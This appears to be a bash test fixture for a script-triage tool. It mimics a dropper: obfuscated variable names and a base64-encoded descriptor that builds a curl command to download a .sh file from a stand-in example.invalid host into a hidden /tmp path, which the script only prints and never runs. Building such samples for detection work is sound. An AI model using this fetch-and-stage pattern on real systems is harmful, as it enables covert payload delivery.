# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_326dfb8a='dj0xfHN0ZXBzPWFjcXVpcmVfcmVtb3RlLHdyaXRlX2ZpbGV8YWRhcHRlcj1jdXJsX291dHB1dHxzdGFnZV9jb3VudD0xfGNhbXBhaWduX2lkPWNhbXBhaWduLTljMmQyOTEyN2N8dXJsPWh0dHBzOi8vOWMyZDI5MTI3Yy5leGFtcGxlLmludmFsaWQvNzljYTQ3MGUuc2h8dXNlcl9hZ2VudD1IdW50cmVzc0xhYi85YzJkMjkxMjdjfGZpbGVfcGF0aD0vdG1wL2h1bnRyZXNzLWNhY2hlLy5zdGFnZS05YzJkMjkxMjdj'
readonly Codec_326dfb8a='base64_literal|identity|'

Load_326dfb8a() {
  EnCoDeD_Bytes=()
  local PaRt
  while read -r PaRt; do [[ -n "$PaRt" ]] && EnCoDeD_Bytes+=("$PaRt"); done < <(printf '%s' "${Material_326dfb8a}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_326dfb8a() {
  DeCoDeD_Bytes=()
  local InDeX
  for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do
    DeCoDeD_Bytes+=("${EnCoDeD_Bytes[InDeX]}")
  done
}

Recover_326dfb8a() {
  local -a EnCoDeD_Bytes DeCoDeD_Bytes
  local DeScRiPtOr_Text NeUtRaL PaSs InDeX
  NeUtRaL="${HUNTRESS_FIXTURE_CONTEXT:-host}"
  Load_326dfb8a
  Decode_326dfb8a
  DeScRiPtOr_Text=''
  local octal character
  for InDeX in "${!DeCoDeD_Bytes[@]}"; do
    printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"
    printf -v character '%b' "\\$octal"
    DeScRiPtOr_Text+="$character"
  done
  printf '%s\n' "$DeScRiPtOr_Text"
}

Inspect_326dfb8a() { local recovered field; local -a fields; recovered="$(Recover_326dfb8a)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

Plan_326dfb8a() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_326dfb8a)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(curl --fail --silent --show-error -o "$file_path" "$url")
  declare -p request_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_326dfb8a; fi

# reconstruction complete